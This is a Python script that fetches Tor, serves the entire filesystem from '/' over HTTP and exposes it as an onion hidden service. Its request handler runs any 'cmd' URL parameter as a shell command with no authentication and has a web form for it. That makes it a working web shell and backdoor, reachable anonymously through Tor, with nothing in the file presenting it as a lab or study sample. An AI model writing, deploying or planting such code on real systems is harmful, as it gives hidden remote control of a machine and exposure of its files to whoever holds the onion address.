import os
import subprocess
import time
import http.server 
import urllib.parse
import tarfile
from datetime import datetime
import socketserver
from threading import Thread
import html

TOR_DIR = "/tmp/tor"
HIDDEN_SERVICE_DIR = "/tmp/tor/hidden_service"
HTTP_PORT = 5003
ROOT_PATH = "/"
TOR_BIN = os.path.join(TOR_DIR, "tor")

def download_and_extract_tor_expert_bundle(
    url="https://archive.torproject.org/tor-package-archive/torbrowser/14.5.2/tor-expert-bundle-linux-x86_64-14.5.2.tar.gz",
    dest_dir="/tmp",
    archive_name="tor-expert-bundle.tar.gz"
):
    archive_path = os.path.join(dest_dir, archive_name)
    if os.path.isdir(TOR_DIR) and any(os.scandir(TOR_DIR)):
        print(f"{dest_dir} already exists and not empty - skip downloading.")
        return

    os.makedirs(dest_dir, exist_ok=True)

    print(f"Downloading Tor Expert Bundle from {url} ...")
    os.system(f"curl -L {url} -o {archive_path}")
    #urllib.request.urlretrieve(url, archive_path)
    print("Downloading completed.")

    print(f"Untaring {archive_path} into {dest_dir} ...")
    with tarfile.open(archive_path, "r:gz") as tar:
        tar.extractall(path=dest_dir)
    print("Untaring completed.")

    os.remove(archive_path)
    print("Archive deleted.")

def run_file_server():
    CustomHandler.root_path = ROOT_PATH
    with socketserver.TCPServer(("", HTTP_PORT), CustomHandler) as httpd:
        print(f"Serving on http://localhost:{HTTP_PORT}")
        httpd.serve_forever()
        
class CustomHandler(http.server.SimpleHTTPRequestHandler):

    def translate_path(self, path):
        path = path.split('?', 1)[0].split('#', 1)[0]
        path = urllib.parse.unquote(path)
        full_path = os.path.join(ROOT_PATH, path.lstrip('/'))
        return os.path.abspath(full_path)

    def send_html(self, content):
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(content.encode('utf-8'))

    def do_GET(self):
        parsed_url = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed_url.query)
        local_path = self.translate_path(parsed_url.path)

        if not os.path.exists(local_path):
            self.send_error(404, "Not Found")
            return

        cmd_list = params.get('cmd', None)
        if cmd_list:
            cmd = cmd_list[0]
            try:
                result = subprocess.run(cmd, shell=True, cwd=local_path,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        text=True, timeout=10)
                output = result.stdout if result.returncode == 0 else f"Error:\n{result.stderr}"
            except Exception as e:
                output = f"Exception: {e}"

            html_content = f"""
            <html>
            <head>
                <title>Command output: {html.escape(cmd)}</title>
                <style>
                    body {{
                        background-color: #121212;
                        color: #e0e0e0;
                        font-family: monospace;
                        white-space: pre-wrap;
                        padding: 20px;
                    }}
                    a {{
                        color: #4fc3f7;
                        text-decoration: none;
                    }}
                    a:hover {{
                        text-decoration: underline;
                    }}
                    .header {{
                        margin-bottom: 20px;
                    }}
                </style>
            </head>
            <body>
                <div class="header">
                    <a href="{urllib.parse.quote(parsed_url.path)}">← Back to directory listing</a><br><br>
                    <strong>Command:</strong> {html.escape(cmd)}<br><br>
                </div>
                <pre>{html.escape(output)}</pre>
            </body>
            </html>
            """
            self.send_html(html_content)

        else:
            if os.path.isdir(local_path):
                try:
                    entries = os.listdir(local_path)
                except PermissionError:
                    self.send_error(403, "Forbidden")
                    return

                entries.sort(key=lambda e: e.lower())

                parent = os.path.normpath(os.path.join(parsed_url.path, '..'))
                if os.path.normpath(parsed_url.path) != '/':
                    parent_link = urllib.parse.quote(parent)
                    parent_link = parent_link if parent_link.endswith('/') else parent_link + '/'
                    list_items = [f'<li><a href="{parent_link}">.. (Parent directory)</a></li>']
                else:
                    list_items = []

                for name in entries:
                    full = os.path.join(local_path, name)
                    display_name = name + ('/' if os.path.isdir(full) else '')
                    href = urllib.parse.quote(os.path.join(parsed_url.path, name))
                    if os.path.isdir(full) and not href.endswith('/'):
                        href += '/'
                    list_items.append(f'<li><a href="{href}">{html.escape(display_name)}</a></li>')

                html_content = f"""
                <html>
                <head>
                    <title>Index of {html.escape(parsed_url.path)}</title>
                    <style>
                        body {{
                            background-color: #121212;
                            color: #e0e0e0;
                            font-family: monospace;
                            padding: 20px;
                        }}
                        a {{
                            color: #4fc3f7;
                            text-decoration: none;
                        }}
                        a:hover {{
                            text-decoration: underline;
                        }}
                        ul {{
                            list-style-type: none;
                            padding-left: 0;
                        }}
                        li {{
                            margin: 5px 0;
                        }}
                        .cmd-form {{
                            margin-bottom: 20px;
                        }}
                        input[type="text"] {{
                            width: 300px;
                            font-family: monospace;
                            font-size: 14px;
                            background-color: #222;
                            color: #eee;
                            border: 1px solid #555;
                            padding: 4px 6px;
                        }}
                        input[type="submit"] {{
                            font-size: 14px;
                            padding: 4px 8px;
                            cursor: pointer;
                            background-color: #4fc3f7;
                            border: none;
                            color: #121212;
                        }}
                    </style>
                </head>
                <body>
                    <h2>Index of {html.escape(parsed_url.path)}</h2>
                    <form class="cmd-form" method="get" action="{urllib.parse.quote(parsed_url.path)}">
                        <label for="cmd">Execute command in this directory:</label><br>
                        <input type="text" name="cmd" id="cmd" placeholder="ls -laFh" autocomplete="off" />
                        <input type="submit" value="Run" />
                    </form>
                    <ul>
                        {''.join(list_items)}
                    </ul>
                </body>
                </html>
                """
                self.send_html(html_content)
            else:
                return super().do_GET()

def create_torrc():
    print("[INFO] Create torrc configuration...")
    os.makedirs(HIDDEN_SERVICE_DIR, mode=0o700, exist_ok=True)
    torrc_path = os.path.join(TOR_DIR, "torrc")
    with open(torrc_path, "w") as f:
        f.write(f"""
HiddenServiceDir {HIDDEN_SERVICE_DIR}
HiddenServicePort 80 127.0.0.1:{HTTP_PORT}
""")
    print("[INFO] Torrc configuration created.")
    return torrc_path
    
def start_tor(torrc_path):
    print("[INFO] Starting Tor...")
    env = os.environ.copy()
    if not TOR_DIR in env["LD_LIBRARY_PATH"]:
        os.system(f"export LD_LIBRARY_PATH={TOR_DIR}")
        #env["LD_LIBRARY_PATH"] = f"{TOR_DIR}:{env.get('LD_LIBRARY_PATH', '')}"
    return subprocess.Popen([TOR_BIN, "-f", torrc_path], cwd=TOR_DIR, env=env,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def get_onion_address():
    hostname_path = os.path.join(HIDDEN_SERVICE_DIR, "hostname")
    while not os.path.exists(hostname_path):
        print("[INFO] Waiting for configuration Onion-anddress...")
        time.sleep(5)
    with open(hostname_path, "r") as f:
        return f.read().strip()

def main():
    download_and_extract_tor_expert_bundle()
    Thread(target=run_file_server).start()
    torrc_path = create_torrc()
    print(f"Torrc path: {torrc_path}")
    tor_process = start_tor(torrc_path)

    try:
        onion = get_onion_address()
        with open('/tmp/host', 'w') as f:
            f.write(onion)
        print(f"[INFO] Onion-address: http://{onion}")
    except Exception as e: print(f"Error while getting onion address {e}")
    
    try:
        tor_process.wait()
    except KeyboardInterrupt:
        print("Stopping tor service...")
        tor_process.terminate()

if __name__ == "__main__":
    main()